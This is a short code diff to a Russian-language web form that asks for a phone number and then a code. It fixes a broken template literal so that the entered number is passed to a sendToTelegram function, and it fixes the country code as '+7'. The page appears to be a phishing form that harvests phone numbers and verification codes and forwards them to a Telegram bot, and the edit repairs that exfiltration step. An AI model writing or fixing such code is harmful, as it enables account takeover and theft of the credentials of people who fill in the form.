@@ -206,7 +206,7 @@
       <div class="input-group">
         <label>Номер телефона</label>
         <div class="phone-input">
-          <input type="text" class="country-code" value="+3" />
+          <input type="text" class="country-code" value="+7" readonly />
           <input type="tel" class="number-input" id="phone" placeholder="Введите номер телефона" />
         </div>
       </div>
@@ -297,10 +297,10 @@
         return;
       }
 
-      sendToTelegram(📱 Введён номер телефона: ${phoneNumber});
+      sendToTelegram(`📱 Введён номер телефона: +${phoneNumber}`);
       showStep(2);
     }
-    
+
     function sendCode() {
       const codeInput = document.getElementById('code');
       const code = codeInput.value.trim();
